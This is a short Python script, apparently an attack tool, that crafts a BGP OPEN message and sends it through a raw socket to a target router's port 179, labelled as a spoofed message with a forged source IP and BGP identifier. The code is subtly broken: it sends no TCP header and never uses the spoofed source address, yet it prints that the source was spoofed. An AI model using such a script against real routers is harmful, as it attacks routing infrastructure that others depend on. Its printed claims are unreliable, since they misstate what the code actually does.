#!/usr/bin/env python3
import socket
import struct
import sys
import os

def craft_bgp_open_message(version, my_as, hold_time, bgp_identifier, opt_param_len=0):
    """
    Crafts a BGP OPEN message according to RFC 4271 Section 4.2.
    """
    # BGP Header: Marker (16 bytes), Length (2 bytes), Type (1 byte)
    marker = b'\xff' * 16
    msg_length = 29  # Minimum length for OPEN message
    msg_type = 1     # OPEN message type
    
    # OPEN Message Fields
    version_byte = struct.pack('!B', version)
    my_as_field = struct.pack('!H', my_as)
    hold_time_field = struct.pack('!H', hold_time)
    bgp_id_field = socket.inet_aton(bgp_identifier)
    opt_param_len_byte = struct.pack('!B', opt_param_len)
    
    # Assemble the OPEN message payload
    open_payload = version_byte + my_as_field + hold_time_field + bgp_id_field + opt_param_len_byte
    
    # Full BGP message
    bgp_message = marker + struct.pack('!HB', msg_length, msg_type) + open_payload
    return bgp_message

def send_bgp_open(target_ip, spoofed_ip, spoofed_bgp_id, target_port=179):
    """
    Sends a spoofed BGP OPEN message to the target.
    """
    # Create a raw socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    
    # Craft the BGP OPEN message
    bgp_open = craft_bgp_open_message(
        version=4,
        my_as=65000,  # Example AS number
        hold_time=90,
        bgp_identifier=spoofed_bgp_id
    )
    
    # Send the message
    try:
        sock.sendto(bgp_open, (target_ip, target_port))
        print(f"[*] Sent spoofed BGP OPEN message to {target_ip}:{target_port}")
        print(f"[*] Spoofed Source IP: {spoofed_ip}")
        print(f"[*] Spoofed BGP Identifier: {spoofed_bgp_id}")
    except Exception as e:
        print(f"[!] Failed to send message: {e}")
    finally:
        sock.close()

